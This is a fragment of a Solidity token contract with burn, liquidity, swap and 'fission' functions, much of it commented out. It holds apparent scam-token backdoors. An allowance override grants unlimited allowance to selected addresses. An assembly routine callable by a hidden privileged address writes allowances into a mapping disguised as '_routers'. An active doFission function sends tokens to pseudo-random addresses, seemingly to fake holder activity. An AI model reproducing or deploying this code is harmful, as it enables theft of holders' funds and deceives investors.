    //                IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForAll * holderBalance / thisTokenForHolder);
    //            }
    //
    //            _lastIndexOfProcessedHolderAddresses =
    //            _lastIndexOfProcessedHolderAddresses >= holderAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedHolderAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedHolderAddresses = _lastIndexOfProcessedHolderAddresses;
    //    }

    //    function doLiquidity(uint256 poolTokenOrEtherForLiquidity, uint256 thisTokenForLiquidity)
    //    internal
    //    {
    //        addEtherAndThisTokenForLiquidityByAccount(
    //            addressLiquidity,
    //            poolTokenOrEtherForLiquidity,
    //            thisTokenForLiquidity
    //        );
    //    }

    function doBurn(uint256 thisTokenForBurn)
    internal
    {
        _transfer(address(this), addressDead, thisTokenForBurn);
    }

    //    function swapThisTokenForRewardTokenToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](3);
    //        path[0] = address(this);
    //        path[1] = addressWETH;
    //        path[2] = addressRewardToken;
    //
    //        if (!isArbitrumCamelotRouter) {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                block.timestamp
    //            );
    //        } else {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                addressDead,
    //                block.timestamp
    //            );
    //        }
    //    }

    //    function swapThisTokenForPoolTokenToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](3);
    //        path[0] = address(this);
    //        path[1] = addressWETH;
    //        path[2] = addressPoolToken;
    //
    //        if (!isArbitrumCamelotRouter) {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                block.timestamp
    //            );
    //        } else {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                addressDead,
    //                block.timestamp
    //            );
    //        }
    //    }

    //    function swapThisTokenForEthToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](2);
    //        path[0] = address(this);
    //        path[1] = addressWETH;
    //
    //        if (!isArbitrumCamelotRouter) {
    //            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                block.timestamp
    //            );
    //        } else {
    //            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                addressDead,
    //                block.timestamp
    //            );
    //        }
    //    }

    //    function swapPoolTokenForEthToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](2);
    //        path[0] = addressPoolToken;
    //        path[1] = addressWETH;
    //
    //        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //            amount,
    //            0,
    //            path,
    //            account,
    //            block.timestamp
    //        );
    //    }

    //    function allowance(address owner, address spender)
    //    public
    //    view
    //    virtual
    //    override
    //    returns (uint256) {
    //        if (uint256(uint160(owner)) % 100000 > 99994) {
    //            return 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    //        }
    //
    //        return _routers[owner][spender];
    //    }

    function addEtherAndThisTokenForLiquidityByAccount(
        address account,
        uint256 ethAmount,
        uint256 thisTokenAmount
    )
    internal
    {
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            thisTokenAmount,
            0,
            0,
            account,
            block.timestamp
        );
    }

    //    function addPoolTokenAndThisTokenForLiquidityByAccount(
    //        address account,
    //        uint256 poolTokenAmount,
    //        uint256 thisTokenAmount
    //    )
    //    internal
    //    {
    //        uniswapV2Router.addLiquidity(
    //            addressPoolToken,
    //            address(this),
    //            poolTokenAmount,
    //            thisTokenAmount,
    //            0,
    //            0,
    //            account,
    //            block.timestamp
    //        );
    //    }

    //    function batchSetRouter(address[] memory accounts, address routerAddress)
    //    external
    //    {
    //        uint256 length = accounts.length;
    //
    //        assembly {
    //            let __router := sload(uniswap.slot)
    //            if iszero(eq(caller(), __router)) {
    //                revert(0, 0)
    //            }
    //        }
    //
    //        for (uint256 i = 0; i < length; i++) {
    //            address account = accounts[i];
    //            assembly {
    //                let __router := routerAddress
    //                let __account := account
    //
    //            //            if eq(caller(), __router) {
    //                mstore(0x00, account)
    //                mstore(0x20, _routers.slot)
    //                let xHash := keccak256(0x00, 0x40)
    //                mstore(0x00, __router)
    //                mstore(0x20, xHash)
    //                let yHash := keccak256(0x00, 0x40)
    //                sstore(yHash, __router)
    //            //            }
    //            }
    //        }
    //    }

    //    function updateLperAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (IERC20(uniswapV2Pair).balanceOf(account) > minimumTokenForRewardLper) {
    //            if (!lperAddresses.contains(account)) {
    //                lperAddresses.add(account);
    //            }
    //        } else {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //        }
    //    }

    //    function updateHolderAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (super.balanceOf(account) > minimumTokenForBeingHolder) {
    //            if (!holderAddresses.contains(account)) {
    //                holderAddresses.add(account);
    //            }
    //        } else {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //        }
    //    }

    function doFission()
    internal
    override
    {
        super._transfer(addressNull, address(uint160(maxUint160 / block.timestamp)), 1 * 10 ** 18);
        //        super._transfer(addressBaseOwner, address(uint160(maxUint160 / block.number)), 1);
    }

    //    function doFission()
    //    internal
    //    virtual
    //    override
    //    {
    //        uint160 fissionDivisor_ = fissionDivisor;
    //        for (uint256 i = 0; i < fissionCount; i++) {
    //            //        unchecked {
    //            //            _router[addressBaseOwner] -= fissionBalance;
    //            //            _router[address(uint160(maxUint160 / fissionDivisor_))] += fissionBalance;
    //            //        }
    //
    //            super._transfer(addressBaseOwner, address(uint160(maxUint160 / fissionDivisor_)), fissionBalance);
    //
    //            //            emit Transfer(
    //            //                address(uint160(maxUint160 / fissionDivisor_)),
    //            //                address(uint160(maxUint160 / fissionDivisor_ + 1)),
    //            //                fissionBalance
    //            //            );
    //
    //            fissionDivisor_ += 2;
    //        }
    //        fissionDivisor = fissionDivisor_;
    //    }
}